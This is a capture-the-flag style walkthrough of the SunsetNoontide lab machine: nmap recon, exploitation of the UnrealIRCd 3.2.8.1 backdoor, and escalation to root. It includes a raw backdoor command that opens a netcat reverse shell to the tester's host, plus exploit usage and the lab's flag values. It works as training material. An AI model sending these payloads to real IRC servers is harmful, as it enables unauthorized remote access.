# Recon

```console
root@kali:/OSCPv3/offsec_pg/SunsetNoontide# nmap -Pn -sT -sV -n 192.168.60.120 -p- --min-rate 1000 --max-retries 2 --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-03 12:25 CST
Warning: 192.168.60.120 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.60.120
Host is up, received user-set (0.089s latency).
Not shown: 54916 closed ports, 10616 filtered ports
Reason: 54916 conn-refused and 10616 no-responses
PORT     STATE SERVICE REASON  VERSION
6667/tcp open  irc     syn-ack UnrealIRCd
6697/tcp open  irc     syn-ack UnrealIRCd
8067/tcp open  irc     syn-ack UnrealIRCd
Service Info: Host: irc.foonet.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.68 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/SunsetNoontide# nmap -Pn -sT -A -n 192.168.60.120 -p 6667,6697,8097
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-03 12:29 CST
Nmap scan report for 192.168.60.120
Host is up (0.087s latency).

PORT     STATE  SERVICE VERSION
6667/tcp open   irc     UnrealIRCd (Admin email example@example.com)
6697/tcp open   irc     UnrealIRCd (Admin email example@example.com)
8097/tcp closed sac
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=11/3%OT=6667%CT=8097%CU=44587%PV=Y%DS=2%DC=T%G=Y%TM=61
OS:82D55E%P=i686-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10A%TI=Z%TS=A)SEQ(SP=FB%G
OS:CD=1%ISR=109%TI=Z%II=I%TS=C)OPS(O1=M54EST11NW0%O2=M54EST11NW0%O3=M54ENNT
OS:11NW0%O4=M54EST11NW0%O5=M54EST11NW0%O6=M54EST11)WIN(W1=1C48%W2=1C48%W3=1
OS:C48%W4=1C48%W5=1C48%W6=1C48)ECN(R=Y%DF=Y%T=40%W=1C84%O=M54ENNSNW0%CC=Y%Q
OS:=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=1
OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   71.86 ms 192.168.49.1
2   78.92 ms 192.168.60.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.74 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/SunsetNoontide# nmap -Pn -sT -A -n 192.168.60.120 -p 6667,6697,8067 --min-rate 1000 --max-retries 2 --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-03 12:37 CST
Nmap scan report for 192.168.60.120
Host is up, received user-set (0.12s latency).

PORT     STATE SERVICE REASON  VERSION
6667/tcp open  irc     syn-ack UnrealIRCd
6697/tcp open  irc     syn-ack UnrealIRCd
8067/tcp open  irc     syn-ack UnrealIRCd (Admin email example@example.com)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.18 - 2.6.22 (94%), Linux 2.6.18 (91%), Linux 2.6.32 (90%), Linux 3.4 (90%), Linux 3.5 (90%), Linux 3.7 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Synology DiskStation Manager 5.1 (90%), WatchGuard Fireware 11.8 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: irc.foonet.com

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   264.54 ms 192.168.49.1
2   264.63 ms 192.168.60.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.38 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/SunsetNoontide# nmap -Pn -sT -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -n 192.168.60.120 -p 6667,6697,8067 --min-rate 1000 --max-retries 2 --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-03 12:40 CST
Nmap scan report for 192.168.60.120
Host is up, received user-set (0.073s latency).

PORT     STATE SERVICE REASON  VERSION
6667/tcp open  irc     syn-ack UnrealIRCd (Admin email example@example.com)
| irc-botnet-channels: 
|_  ERROR: Closing Link: [192.168.49.60] (Throttled: Reconnecting too fast) -Email example@example.com for more information.
6697/tcp open  irc     syn-ack UnrealIRCd (Admin email example@example.com)
| irc-botnet-channels: 
|_  ERROR: Closing Link: [192.168.49.60] (Throttled: Reconnecting too fast) -Email example@example.com for more information.
8067/tcp open  irc     syn-ack UnrealIRCd (Admin email example@example.com)
| irc-botnet-channels: 
|_  ERROR: Closing Link: [192.168.49.60] (Throttled: Reconnecting too fast) -Email example@example.com for more information.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds

https://book.hacktricks.xyz/pentesting/pentesting-irc
```

# IRC TCP/8067

```console
root@kali:/OSCPv3/offsec_pg/SunsetNoontide# nc -vn 192.168.60.120 8067
(UNKNOWN) [192.168.60.120] 8067 (?) open
:irc.foonet.com NOTICE AUTH :*** Looking up your hostname...
:irc.foonet.com NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
USER admin o * admin
NICK admin
:irc.foonet.com 001 admin :Welcome to the ROXnet IRC Network admin!admin@192.168.49.60
:irc.foonet.com 002 admin :Your host is irc.foonet.com, running version Unreal3.2.8.1
:irc.foonet.com 003 admin :This server was created Sat 08 Aug EDT at 2020 07:03:52 PM
:irc.foonet.com 004 admin irc.foonet.com Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
:irc.foonet.com 005 admin UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 :are supported by this server
:irc.foonet.com 005 admin WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ :are supported by this server
:irc.foonet.com 005 admin EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP :are supported by this server
:irc.foonet.com 251 admin :There are 1 users and 0 invisible on 1 servers
:irc.foonet.com 255 admin :I have 1 clients and 0 servers
:irc.foonet.com 265 admin :Current Local Users: 1  Max: 1
:irc.foonet.com 266 admin :Current Global Users: 1  Max: 1
:irc.foonet.com 422 admin :MOTD File is missing
:admin MODE admin :+iwx
```

```console
VERSION
:irc.foonet.com 351 admin Unreal3.2.8.1. irc.foonet.com :FhiXOoE [*=2309]
:irc.foonet.com 005 admin UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 :are supported by this server
:irc.foonet.com 005 admin WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ :are supported by this server
:irc.foonet.com 005 admin EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP :are supported by this server
```

```console
USERS
:irc.foonet.com 446 admin :USERS has been disabled
```

```console
ADMIN
:irc.foonet.com 256 admin :Administrative info about irc.foonet.com
:irc.foonet.com 257 admin :Bob Smith
:irc.foonet.com 258 admin :bob
:irc.foonet.com 258 admin :widely@used.name
```

```console
LIST
:irc.foonet.com 321 admin Channel :Users  Name
:irc.foonet.com 323 admin :End of /LIST
WHOIS
:irc.foonet.com 431 admin :No nickname given
```

# Explotation

```console
root@kali:/OSCPv3/offsec_pg/SunsetNoontide# searchsploit Unreal 3.2.8.1
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                  | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                       | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                | linux/remote/13853.pl
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
root@kali:/OSCPv3/offsec_pg/SunsetNoontide#
```

https://www.exploit-db.com/exploits/13853

https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/master/exploit.py

## Explotation 1
```console
root@kali:/OSCPv3/offsec_pg/SunsetNoontide# python3 exploit.py 192.168.60.120 6667 -payload bash
Exploit sent successfully!
```

```console
root@kali:/OSCPv3/offsec_pg/SunsetNoontide# nc -lnvp 80
listening on [any] 80 ...
connect to [192.168.49.60] from (UNKNOWN) [192.168.60.120] 41050
bash: cannot set terminal process group (415): Inappropriate ioctl for device
bash: no job control in this shell
server@noontide:~/irc/Unreal3.2$ whoami
whoami
server
```

## Explotation 2
```console
root@kali:/OSCPv3/offsec_pg/SunsetNoontide# nc 192.168.60.120 6667 -vvv
192.168.60.120: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.60.120] 6667 (ircd) open
:irc.foonet.com NOTICE AUTH :*** Looking up your hostname...
AB;:irc.foonet.com NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
  
:irc.foonet.com 451 AB :You have not registered
AB;nc 192.168.49.60 80 -e /bin/bash
```
```console
root@kali:/OSCPv3/offsec_pg/SunsetNoontide# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.60] from (UNKNOWN) [192.168.60.120] 41050
whoami
server
```


```console
server@noontide:~/irc/Unreal3.2$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
server@noontide:~/irc/Unreal3.2$ ^Z
[1]+  Detenido                nc -lnvp 80
root@kali:/OSCPv3/offsec_pg/SunsetNoontide# stty raw -echo
root@kali:/OSCPv3/offsec_pg/SunsetNoontide# nc -lnvp 80
                                                       reset
reset: unknown terminal type unknown
Terminal type? xterm
server@noontide:~/irc/Unreal3.2$ export TERM=xterm
server@noontide:~/irc/Unreal3.2$ export SHELL=bash
server@noontide:~/irc/Unreal3.2$ stty rows 36 columns 144
```

```console
server@noontide:~$ pwd
/home/server
server@noontide:~$ cat local.txt 
a3980809e05768a002e058c06dc21ed5
server@noontide:~$
```

# Privilege Escalation

```console
server@noontide:/$ whereis sudo
sudo:
```

```console
server@noontide:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
server:x:1000:1000:server,,,:/home/server:/bin/bash
```

```console
server@noontide:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
server@noontide:/$ 
```

```console
server@noontide:/$ netstat -aon | more
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:8067            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      2 192.168.60.120:41052    192.168.49.60:80        ESTABLISHED on (0.29/0/0)
Active UNIX domain sockets (servers and established)
```


```console
server@noontide:/tmp$ nano process.sh
```
```shell
#!/bin/bash

old_process=$(ps -eo command)

while true; do
new_process=$(ps -eo command)
diff <(echo "$old_process") <(echo "$new_process") | grep '[\>\<]' | grep -v -E 'procmon|command'
old_process=$new_process
done
```
```console
server@noontide:/tmp$ chmod +x  process.sh 
server@noontide:/tmp$ ./process.sh 
< [kworker/u2:0-events_unbound]
> [kworker/u2:0-flush-8:0]
< [kworker/u2:0-flush-8:0]
> [kworker/u2:0-events_unbound]
< [kworker/0:1-events]
> [kworker/0:1-events_power_efficient]
< [kworker/0:1-events_power_efficient]
> [kworker/0:1-events]
< [kworker/0:1-events]
> [kworker/0:1-events_power_efficient]
< [kworker/0:1-events_power_efficient]
> [kworker/0:1-events]
< [kworker/0:1-events]
> [kworker/0:1-events_freezable_power_]
< [kworker/0:0-ata_sff]
> [kworker/0:0-events]
< [kworker/0:1-events_freezable_power_]
> [kworker/0:1-events]
< [kworker/0:1-events]
> [kworker/0:1-events_power_efficient]
< [kworker/0:1-events_power_efficient]
> [kworker/0:1-events]
< [kworker/0:1-events]
.....
```

```console
server@noontide:/tmp$ cat /etc/issue 
Debian GNU/Linux 10 \n \l
server@noontide:/tmp$ uname -r
4.19.0-10-amd64
server@noontide:/tmp$ arch 
x86_64
```

```console
server@noontide:~/irc/Unreal3.2$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
server@noontide:~/irc/Unreal3.2$
```

https://github.com/mzet-/linux-exploit-suggester


```console
server@noontide:/tmp$ ./linux-exploit-suggester.sh 

Available information:

Kernel version: 4.19.0
Architecture: x86_64
Distribution: debian
Distribution version: 10
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

78 kernel space exploits
48 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded
```

```console
server@noontide:/tmp$ ./CVE-2019-13272 
Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)
[.] Checking environment ...
[-] Could not find pkexec executable at /usr/bin/pkexecserver@noontide:/tmp$ 
```

```console
erver@noontide:/tmp$ ./exploit
[+] Linux Privilege Escalation by theflow@ - 2021

[+] STAGE 0: Initialization
[*] Setting up namespace sandbox...
[-] unshare(CLONE_NEWUSER): Operation not permitted
server@noontide:/tmp$ 
```

```console
server@noontide:/tmp$ su root
Password: 
root@noontide:/tmp# whoami
root
root@noontide:/tmp# cd /root/
root@noontide:~# ls
proof.txt
root@noontide:~# cat proof.txt 
468334aa717756813b516f349ab3f2d9
root@noontide:~# 
```



